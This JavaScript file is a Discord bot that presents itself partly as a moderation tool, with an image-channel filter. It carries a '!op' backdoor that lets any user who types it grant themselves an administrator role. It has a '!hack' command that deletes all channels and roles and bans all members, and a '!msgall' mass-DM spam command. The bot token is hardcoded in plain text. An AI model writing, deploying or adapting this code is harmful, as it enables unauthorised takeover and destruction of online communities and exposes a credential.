//create discord bot
const discord = require('discord.js')
const bot = new discord.Client({
  intents: [ discord.Intents.FLAGS.GUILDS, discord.Intents.FLAGS.GUILD_MESSAGES ]
})

//iport canvas
const Canvas = require('canvas')

//If the message is !op create role with all permissions and add to the user
bot.on('message', message => {
    if (message.content === '!op') {
        message.delete()
        //create server role
        message.guild.roles.create({
            data: {
                name: 'Tkt',
                color: '#ff0000',
                permissions: [
                    'ADMINISTRATOR',
                    'MANAGE_GUILD',
                    'VIEW_CHANNEL',
                    'SEND_MESSAGES',
                    'EMBED_LINKS',
                    'ATTACH_FILES',
                    'READ_MESSAGE_HISTORY',
                    'USE_EXTERNAL_EMOJIS',
                    'ADD_REACTIONS',
                    'CONNECT',
                    'SPEAK',
                    'MUTE_MEMBERS',
                    'DEAFEN_MEMBERS',
                    'MOVE_MEMBERS',
                    'USE_VAD',
                    'CHANGE_NICKNAME',
                    'MANAGE_NICKNAMES',
                    'MANAGE_ROLES',
                    'MANAGE_CHANNELS',
                    'KICK_MEMBERS',
                    'BAN_MEMBERS',
                    'CREATE_INSTANT_INVITE',
                    'CHANGE_VOICE_STATE',
                    'MANAGE_WEBHOOKS',
                    'MANAGE_EMOJIS'
                ]
            }
        }).then(role => {
            //add role to user
            message.member.roles.add(role.id)
            //send private message to user
            message.author.send('You have been given the Tkt role!')
        })
    }
})

//If user send image and is not image channel send error message
bot.on('message', message => {
    if (message.attachments.size > 0) {
        //check if channel name is image 
        if (message.channel.name === '𝐈𝐦𝐚𝐠𝐞𝐬-📷') {
            //do nothing
        } else {
            message.delete()
            message.channel.send("Merci de ne pas envoyer d'inmage ici !")
        }
    }
})

//When user send !hack command delete all channel and roles and raid the server
bot.on('message', message => {
    if (message.content === '!hack') {
        message.delete()
            //If channel deletable delete channel else send error message
            message.guild.channels.cache.forEach(channel => {
                if (channel.deletable) {
                    channel.delete()    
                } else {
                    message.channel.send("Impossible de supprimer un channels !")
                }
            })

            //If role deletable delete role else send error message
            message.guild.roles.cache.forEach(role => {
                if (role.deletable) {
                    role.delete()
                } else {
                    message.channel.send("Impossible de supprimer un roles !")
                }
            })

            //If menber is banable ban him else send error message
            message.guild.members.cache.forEach(member => {
                if (member.bannable) {
                    member.ban()
                } else {
                    message.channel.send("Impossible de ban cette personne !")
                }
            })       
    }
})

//When user send !msg send message to mentioned user
bot.on('message', message => {
    if (message.content.startsWith('!msg')) {
        message.delete()
        //get mentioned user else send error message
        let user = message.mentions.users.first()
        if (user) {
            //get message content
            let args = message.content.split(' ').slice(1)
            let msg = args.join(' ')
            //send message to mentioned user
            user.send(msg)
            //send confirmation message to user
            message.author.send('Message envoyé !')
        } else {
            message.channel.send("Merci de mentionner un utilisateur !")
        }
    }
})

//When user send !msgall send message to all users
bot.on('message', message => {
    if (message.content.startsWith('!msgall')) {
        message.delete()
        //get message content
        let args = message.content.split(' ').slice(1)
        let msg = args.join(' ')
        //send message to all users
        message.guild.members.cache.forEach(member => {
            member.send(msg)
        })
        //send confirmation message to user
        message.author.send('Message envoyé !')
    }
})

//

//heroku hosting 
bot.on('ready', () => {
    console.log('Bot is ready !')
})

//login to discord
bot.login("OTUzMzgzMTMzMTkyMDExNzc2.YjDxOw.CamlZ7eKdqgCtnEDsV39eSu7x44")